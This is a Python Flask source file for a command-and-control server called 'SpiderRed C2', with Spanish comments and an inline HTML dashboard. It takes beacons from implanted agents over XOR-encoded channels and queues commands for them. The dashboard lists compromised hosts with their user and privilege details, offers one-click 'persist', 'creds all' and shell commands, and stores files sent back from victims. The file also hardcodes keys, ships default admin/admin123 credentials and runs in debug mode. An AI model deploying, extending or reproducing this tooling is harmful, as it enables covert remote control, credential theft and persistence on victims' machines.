# spiderred_c2_kali.py - Versión optimizada para Kali
import json
import base64
import sqlite3
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string, send_file, session, redirect, url_for
from flask_socketio import SocketIO, emit
import hashlib
import os
import uuid
from werkzeug.utils import secure_filename
import logging

# Configuración
app = Flask(__name__)
app.config['SECRET_KEY'] = 'SpiderRedKali2024!@#$%'
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['DATABASE'] = 'c2_database.db'
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024

# Usar eventlet para mejor rendimiento en WebSockets
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

# Configuración C2
C2_KEY = "SpiderRedMasterKey2024!@#$%"

# Plantillas HTML inline
TEMPLATES = {
    'login': '''<!DOCTYPE html>
<html>
<head>
    <title>SpiderRed C2 - Login</title>
    <style>
        body { 
            font-family: 'Courier New', monospace;
            background: #0a0a0f; 
            color: #00ff88;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .login-container {
            background: rgba(10, 10, 15, 0.95);
            padding: 40px;
            border-radius: 10px;
            border: 2px solid #00ff88;
            box-shadow: 0 0 30px rgba(0, 255, 136, 0.3);
            width: 350px;
        }
        h1 {
            text-align: center;
            margin-bottom: 30px;
            text-shadow: 0 0 10px #00ff88;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            background: #000;
            border: 1px solid #00ff88;
            color: #00ff88;
            border-radius: 5px;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #00ff88;
            color: #000;
            border: none;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        .error {
            color: #ff0000;
            text-align: center;
            margin-bottom: 10px;
        }
        .glow {
            animation: glow 2s infinite alternate;
        }
        @keyframes glow {
            from { box-shadow: 0 0 20px rgba(0, 255, 136, 0.5); }
            to { box-shadow: 0 0 40px rgba(0, 255, 136, 0.8); }
        }
    </style>
</head>
<body>
    <div class="login-container glow">
        <h1>🕷️ SPIDERRED C2</h1>
        {% if error %}
        <div class="error">{{ error }}</div>
        {% endif %}
        <form method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">ACCESS</button>
        </form>
        <div style="text-align: center; margin-top: 20px; color: #666; font-size: 12px;">
            Default: admin / admin123
        </div>
    </div>
</body>
</html>''',

    'dashboard': '''<!DOCTYPE html>
<html>
<head>
    <title>SpiderRed C2 Dashboard</title>
    <style>
        :root {
            --primary: #00ff88;
            --secondary: #ff0080;
            --dark: #0a0a0f;
            --light: #f0f0f0;
        }
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Courier New', monospace;
            background: var(--dark);
            color: var(--light);
            overflow-x: hidden;
        }
        header {
            background: linear-gradient(135deg, #000, #111);
            padding: 20px;
            border-bottom: 2px solid var(--primary);
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
        }
        .logo {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .logo h1 {
            color: var(--primary);
            text-shadow: 0 0 10px var(--primary);
        }
        .status-bar {
            display: flex;
            gap: 20px;
            color: var(--primary);
        }
        .container {
            display: grid;
            grid-template-columns: 1fr 2fr;
            gap: 20px;
            padding: 20px;
            height: calc(100vh - 100px);
        }
        .panel {
            background: rgba(0, 0, 0, 0.7);
            border: 1px solid var(--primary);
            border-radius: 10px;
            padding: 15px;
            overflow: hidden;
        }
        .panel-title {
            color: var(--primary);
            margin-bottom: 15px;
            padding-bottom: 5px;
            border-bottom: 1px solid var(--primary);
        }
        .agent-list {
            max-height: 300px;
            overflow-y: auto;
        }
        .agent-item {
            background: rgba(0, 255, 136, 0.1);
            padding: 10px;
            margin: 5px 0;
            border-radius: 5px;
            border-left: 3px solid var(--primary);
            cursor: pointer;
        }
        .agent-item:hover {
            background: rgba(0, 255, 136, 0.2);
        }
        .terminal {
            background: #000;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            padding: 15px;
            height: 300px;
            overflow-y: auto;
            border-radius: 5px;
            border: 1px solid #00ff00;
        }
        .terminal-line {
            margin-bottom: 5px;
        }
        .command-input {
            width: 100%;
            padding: 10px;
            background: #000;
            border: 1px solid var(--primary);
            color: var(--primary);
            border-radius: 5px;
            margin-top: 10px;
        }
        .btn {
            background: var(--primary);
            color: #000;
            border: none;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            margin-top: 5px;
        }
        .btn:hover {
            opacity: 0.9;
        }
        .btn-danger {
            background: var(--secondary);
        }
        .quick-buttons {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-top: 10px;
        }
        .file-manager {
            margin-top: 20px;
        }
        .file-item {
            background: rgba(255, 0, 128, 0.1);
            padding: 10px;
            margin: 5px 0;
            border-radius: 5px;
        }
        ::-webkit-scrollbar {
            width: 8px;
        }
        ::-webkit-scrollbar-track {
            background: #000;
        }
        ::-webkit-scrollbar-thumb {
            background: var(--primary);
        }
    </style>
</head>
<body>
    <header>
        <div class="logo">
            <h1>🕷️ SPIDERRED C2 v2.0</h1>
        </div>
        <div class="status-bar">
            <div>Agents: <span id="agentCount">0</span></div>
            <div>Commands: <span id="commandCount">0</span></div>
            <button class="btn" onclick="logout()">Logout</button>
        </div>
    </header>
    
    <div class="container">
        <!-- Panel izquierdo: Agentes -->
        <div class="panel">
            <div class="panel-title">ACTIVE AGENTS</div>
            <div class="agent-list" id="agentList">
                <!-- Agents will appear here -->
            </div>
        </div>
        
        <!-- Panel derecho: Control y Terminal -->
        <div class="panel">
            <div class="panel-title">CONTROL PANEL</div>
            
            <div>
                <select id="agentSelect" class="command-input">
                    <option value="">Select Agent</option>
                </select>
                
                <input type="text" id="commandInput" class="command-input" placeholder="Enter command...">
                
                <div class="quick-buttons">
                    <button class="btn" onclick="sendCommand('info')">System Info</button>
                    <button class="btn" onclick="sendCommand('shell whoami')">Whoami</button>
                    <button class="btn" onclick="sendCommand('persist')">Persistence</button>
                    <button class="btn" onclick="sendCommand('creds all')">Credentials</button>
                    <button class="btn btn-danger" onclick="sendCommand('exit')">Kill Agent</button>
                </div>
                
                <button class="btn" onclick="executeCommand()" style="width: 100%; margin-top: 10px;">
                    EXECUTE COMMAND
                </button>
                
                <div class="panel-title" style="margin-top: 20px;">LIVE TERMINAL</div>
                <div class="terminal" id="terminal">
                    <div class="terminal-line">$ SpiderRed C2 Online</div>
                </div>
                
                <div class="panel-title" style="margin-top: 20px;">FILE MANAGER</div>
                <div class="file-manager">
                    <input type="file" id="fileUpload">
                    <button class="btn" onclick="uploadFile()">Upload</button>
                    <div id="fileList"></div>
                </div>
            </div>
        </div>
    </div>
    
    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
    <script>
        const socket = io();
        let selectedAgent = null;
        
        socket.on('connect', () => {
            addTerminalLine('Connected to C2 Server');
            loadAgents();
        });
        
        socket.on('new_agent', (agent) => {
            addTerminalLine(`New agent: ${agent.hostname}`);
            loadAgents();
        });
        
        socket.on('command_result', (data) => {
            addTerminalLine(`Result from ${data.agent_id}: ${data.result}`);
        });
        
        async function loadAgents() {
            try {
                const res = await fetch('/api/agents');
                const agents = await res.json();
                
                document.getElementById('agentCount').textContent = agents.length;
                const agentList = document.getElementById('agentList');
                const agentSelect = document.getElementById('agentSelect');
                
                agentList.innerHTML = '';
                agentSelect.innerHTML = '<option value="">Select Agent</option>';
                
                agents.forEach(agent => {
                    // Add to list
                    const div = document.createElement('div');
                    div.className = 'agent-item';
                    div.innerHTML = `
                        <strong>${agent.hostname}</strong><br>
                        ${agent.username}@${agent.domain}<br>
                        ${agent.os} | ${agent.privileges}
                    `;
                    div.onclick = () => selectAgent(agent.id);
                    agentList.appendChild(div);
                    
                    // Add to select
                    const option = document.createElement('option');
                    option.value = agent.id;
                    option.textContent = `${agent.hostname} (${agent.username})`;
                    agentSelect.appendChild(option);
                });
            } catch (error) {
                console.error('Error loading agents:', error);
            }
        }
        
        function selectAgent(agentId) {
            selectedAgent = agentId;
            document.getElementById('agentSelect').value = agentId;
            addTerminalLine(`Selected agent: ${agentId}`);
        }
        
        async function executeCommand() {
            const cmd = document.getElementById('commandInput').value;
            if (!cmd || !selectedAgent) {
                alert('Select an agent and enter a command');
                return;
            }
            
            try {
                const res = await fetch(`/api/agent/${selectedAgent}/command`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({command: cmd})
                });
                
                if (res.ok) {
                    addTerminalLine(`Command sent: ${cmd}`);
                    document.getElementById('commandInput').value = '';
                    
                    // Update counter
                    let count = parseInt(document.getElementById('commandCount').textContent);
                    document.getElementById('commandCount').textContent = count + 1;
                }
            } catch (error) {
                console.error('Error sending command:', error);
            }
        }
        
        function sendCommand(cmd) {
            if (!selectedAgent) {
                alert('Select an agent first');
                return;
            }
            document.getElementById('commandInput').value = cmd;
            executeCommand();
        }
        
        async function uploadFile() {
            const fileInput = document.getElementById('fileUpload');
            const file = fileInput.files[0];
            
            if (!file || !selectedAgent) return;
            
            const formData = new FormData();
            formData.append('file', file);
            formData.append('agent_id', selectedAgent);
            
            try {
                const res = await fetch('/upload', {
                    method: 'POST',
                    body: formData
                });
                
                if (res.ok) {
                    addTerminalLine(`File uploaded: ${file.name}`);
                }
            } catch (error) {
                console.error('Error uploading file:', error);
            }
        }
        
        function addTerminalLine(text) {
            const terminal = document.getElementById('terminal');
            const line = document.createElement('div');
            line.className = 'terminal-line';
            line.textContent = `$ ${text}`;
            terminal.appendChild(line);
            terminal.scrollTop = terminal.scrollHeight;
        }
        
        function logout() {
            window.location.href = '/logout';
        }
        
        // Load files
        async function loadFiles() {
            try {
                const res = await fetch('/api/files');
                const files = await res.json();
                const fileList = document.getElementById('fileList');
                fileList.innerHTML = '';
                
                files.forEach(file => {
                    const div = document.createElement('div');
                    div.className = 'file-item';
                    div.innerHTML = `
                        ${file.filename} (${file.size} bytes)<br>
                        <small>From: ${file.agent_id}</small>
                        <button onclick="downloadFile(${file.id})">Download</button>
                    `;
                    fileList.appendChild(div);
                });
            } catch (error) {
                console.error('Error loading files:', error);
            }
        }
        
        function downloadFile(fileId) {
            window.open(`/api/file/${fileId}`, '_blank');
        }
        
        // Initial load
        window.onload = () => {
            loadAgents();
            loadFiles();
            setInterval(loadAgents, 5000);
        };
    </script>
</body>
</html>'''
}

# ==================== FUNCIONES BÁSICAS ====================
def xor_encrypt_decrypt(data, key):
    result = bytearray()
    for i in range(len(data)):
        result.append(data[i] ^ ord(key[i % len(key)]))
    return bytes(result)

def encrypt_data(data, key=C2_KEY):
    encrypted = xor_encrypt_decrypt(data.encode(), key)
    return base64.b64encode(encrypted).decode()

def decrypt_data(encrypted_data, key=C2_KEY):
    try:
        decoded = base64.b64decode(encrypted_data)
        decrypted = xor_encrypt_decrypt(decoded, key)
        return decrypted.decode('utf-8', errors='ignore')
    except:
        return ""

def init_db():
    conn = sqlite3.connect(app.config['DATABASE'])
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS agents
                 (id TEXT PRIMARY KEY, hostname TEXT, username TEXT,
                  domain TEXT, os TEXT, arch TEXT, privileges TEXT,
                  ip TEXT, last_seen TEXT)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS commands
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, agent_id TEXT,
                  command TEXT, result TEXT, timestamp TEXT)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (username TEXT PRIMARY KEY, password TEXT)''')
    
    # Default admin user
    c.execute("INSERT OR IGNORE INTO users VALUES ('admin', ?)",
              (hashlib.sha256('admin123'.encode()).hexdigest(),))
    
    conn.commit()
    conn.close()

# Inicializar DB
init_db()

# ==================== RUTAS ====================
@app.route('/')
def index():
    if 'username' not in session:
        return redirect('/login')
    return render_template_string(TEMPLATES['dashboard'])

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        conn = sqlite3.connect(app.config['DATABASE'])
        c = conn.cursor()
        c.execute("SELECT password FROM users WHERE username=?", 
                 (request.form['username'],))
        row = c.fetchone()
        conn.close()
        
        if row and row[0] == hashlib.sha256(request.form['password'].encode()).hexdigest():
            session['username'] = request.form['username']
            return redirect('/')
        
        return render_template_string(TEMPLATES['login'], error="Invalid credentials")
    
    return render_template_string(TEMPLATES['login'])

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')

@app.route('/beacon', methods=['POST'])
def beacon():
    data = decrypt_data(request.get_data(as_text=True))
    if data:
        try:
            agent_data = json.loads(data)
            conn = sqlite3.connect(app.config['DATABASE'])
            c = conn.cursor()
            
            # Guardar/actualizar agente
            c.execute('''INSERT OR REPLACE INTO agents 
                         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                     (agent_data.get('agent_id'),
                      agent_data.get('hostname'),
                      agent_data.get('username'),
                      agent_data.get('domain'),
                      agent_data.get('os'),
                      agent_data.get('arch'),
                      agent_data.get('privileges'),
                      request.remote_addr,
                      datetime.now().isoformat()))
            
            # Obtener comandos pendientes
            c.execute("SELECT command FROM commands WHERE agent_id=? AND result IS NULL",
                     (agent_data.get('agent_id'),))
            commands = [row[0] for row in c.fetchall()]
            
            conn.commit()
            conn.close()
            
            # Notificar por WebSocket
            socketio.emit('new_agent', agent_data)
            
            return encrypt_data(json.dumps({
                'commands': commands,
                'sleep': 60
            }))
        except Exception as e:
            print(f"Beacon error: {e}")
    
    return encrypt_data(json.dumps({'error': 'invalid'}))

@app.route('/result', methods=['POST'])
def result():
    data = decrypt_data(request.get_data(as_text=True))
    if data:
        try:
            result_data = json.loads(data)
            conn = sqlite3.connect(app.config['DATABASE'])
            c = conn.cursor()
            
            # Guardar resultado
            c.execute('''INSERT INTO commands (agent_id, command, result, timestamp)
                         VALUES (?, ?, ?, ?)''',
                     (result_data.get('agent_id'),
                      result_data.get('command'),
                      result_data.get('output'),
                      datetime.now().isoformat()))
            
            conn.commit()
            conn.close()
            
            # Notificar por WebSocket
            socketio.emit('command_result', result_data)
            
            return encrypt_data(json.dumps({'status': 'ok'}))
        except Exception as e:
            print(f"Result error: {e}")
    
    return encrypt_data(json.dumps({'status': 'error'}))

@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        return jsonify({'error': 'No file'})
    
    file = request.files['file']
    agent_id = request.form.get('agent_id')
    
    if file.filename:
        filename = secure_filename(file.filename)
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
        file.save(filepath)
        
        socketio.emit('file_uploaded', {
            'filename': filename,
            'agent_id': agent_id,
            'size': os.path.getsize(filepath)
        })
        
        return jsonify({'status': 'ok'})
    
    return jsonify({'error': 'No file'})

@app.route('/api/agents')
def api_agents():
    if 'username' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    conn = sqlite3.connect(app.config['DATABASE'])
    c = conn.cursor()
    c.execute("SELECT * FROM agents")
    agents = []
    
    for row in c.fetchall():
        agents.append({
            'id': row[0],
            'hostname': row[1],
            'username': row[2],
            'domain': row[3],
            'os': row[4],
            'arch': row[5],
            'privileges': row[6],
            'ip': row[7],
            'last_seen': row[8]
        })
    
    conn.close()
    return jsonify(agents)

@app.route('/api/agent/<agent_id>/command', methods=['POST'])
def api_command(agent_id):
    if 'username' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    command = request.json.get('command')
    if command:
        conn = sqlite3.connect(app.config['DATABASE'])
        c = conn.cursor()
        c.execute('''INSERT INTO commands (agent_id, command, timestamp)
                     VALUES (?, ?, ?)''',
                 (agent_id, command, datetime.now().isoformat()))
        conn.commit()
        conn.close()
        
        return jsonify({'status': 'ok'})
    
    return jsonify({'error': 'No command'}), 400

@app.route('/api/files')
def api_files():
    if 'username' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    files = []
    if os.path.exists(app.config['UPLOAD_FOLDER']):
        for f in os.listdir(app.config['UPLOAD_FOLDER']):
            path = os.path.join(app.config['UPLOAD_FOLDER'], f)
            if os.path.isfile(path):
                files.append({
                    'id': f,
                    'filename': f,
                    'size': os.path.getsize(path)
                })
    
    return jsonify(files)

@app.route('/api/file/<filename>')
def api_file(filename):
    if 'username' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    if os.path.exists(filepath):
        return send_file(filepath, as_attachment=True)
    
    return jsonify({'error': 'File not found'}), 404

# ==================== EJECUCIÓN ====================
if __name__ == '__main__':
    print("""
    ╔═══════════════════════════════════════════════╗
    ║        🕷️ SPIDERRED C2 - Kali Edition        ║
    ║                                               ║
    ║  • Dashboard: http://localhost:8443          ║
    ║  • Login: admin / admin123                   ║
    ║  • Agente: Modifica C2_SERVER en spiderred   ║
    ╚═══════════════════════════════════════════════╝
    """)
    
    # Asegurar directorios
    os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
    
    # Ejecutar servidor
    socketio.run(app, host='0.0.0.0', port=8443, debug=True)
